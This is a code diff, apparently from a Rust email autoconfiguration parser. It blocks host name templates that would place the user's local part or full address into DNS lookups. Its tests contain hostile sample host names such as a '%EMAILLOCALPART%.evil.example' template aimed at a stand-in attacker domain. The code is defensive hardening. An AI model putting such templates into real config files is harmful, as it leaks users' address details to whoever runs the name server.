@@ -76,7 +76,8 @@ struct Candidate {
 }
 
 /// Reads the file for `address`, filling `%EMAILADDRESS%`, `%EMAILLOCALPART%` and `%EMAILDOMAIN%`
-/// into host names and user names. Servers with `socketType` `plain` are ignored; SSL beats
+/// into user names, and `%EMAILDOMAIN%` only into host names (a server entry whose host name
+/// contains the local part or the whole address is ignored, so the local part never reaches DNS). Servers with `socketType` `plain` are ignored; SSL beats
 /// STARTTLS. Returns [`ProbeFailure::OnlyUnencrypted`] when the file offers IMAP only without
 /// encryption and [`ProbeFailure::Unusable`] for anything else wrong with the file.
 pub(crate) fn parse(xml: &[u8], address: &EmailAddress) -> Result<Parsed, ProbeFailure> {
@@ -335,6 +336,13 @@ fn candidate(
         "plain" | "none" => return Err(Reject::Unencrypted),
         _ => return Err(Reject::Other),
     };
+    // A host name is looked up in DNS, so it must never carry the part of the address before the
+    // `@`: a file saying `%EMAILLOCALPART%.evil.example` would send the local part to whoever runs
+    // that name server. Only the domain is allowed in a host name.
+    let host_template = raw.host.to_ascii_uppercase();
+    if host_template.contains("%EMAILLOCALPART%") || host_template.contains("%EMAILADDRESS%") {
+        return Err(Reject::Other);
+    }
     let host = substitute(&raw.host, address).ok_or(Reject::Other)?;
     let host = host.trim().to_ascii_lowercase();
     if !(is_host_name(&host) || host.parse::<IpAddr>().is_ok()) {
@@ -435,6 +443,41 @@ mod tests {
         assert_eq!(smtp.host, "smtp.hosted.example");
         assert_eq!((smtp.port, smtp.security), (587, Security::StartTls));
         assert_eq!(smtp.username, "ann");
+    }
+
+    #[test]
+    fn a_host_name_may_not_contain_the_local_part_or_the_address() {
+        let a = addr("alice@example.org");
+        for host in [
+            "%EMAILLOCALPART%.evil.example",
+            "%emaillocalpart%.evil.example",
+            "imap.%EMAILADDRESS%",
+            "x-%EmailAddress%",
+        ] {
+            let xml = format!(
+                "<c><incomingServer type=\"imap\"><hostname>{host}</hostname><socketType>SSL</socketType></incomingServer></c>"
+            );
+            assert_eq!(
+                parse(xml.as_bytes(), &a).unwrap_err(),
+                ProbeFailure::Unusable,
+                "{host}"
+            );
+        }
+        // The domain is still fine, in a host name and next to a local-part user name.
+        let xml = "<c><incomingServer type=\"imap\"><hostname>imap.%EMAILDOMAIN%</hostname><socketType>SSL</socketType><username>%EMAILLOCALPART%</username></incomingServer></c>";
+        let p = parse(xml.as_bytes(), &a).unwrap();
+        assert_eq!(
+            (p.imap.host.as_str(), p.imap.username.as_str()),
+            ("imap.example.org", "alice")
+        );
+    }
+
+    #[test]
+    fn a_bad_server_entry_does_not_hide_a_good_one() {
+        let a = addr("alice@example.org");
+        let xml = "<c><incomingServer type=\"imap\"><hostname>%EMAILLOCALPART%.evil.example</hostname><socketType>SSL</socketType></incomingServer><incomingServer type=\"imap\"><hostname>mail.example.org</hostname><socketType>STARTTLS</socketType></incomingServer></c>";
+        let p = parse(xml.as_bytes(), &a).unwrap();
+        assert_eq!(p.imap.host, "mail.example.org");
     }
 
     #[test]
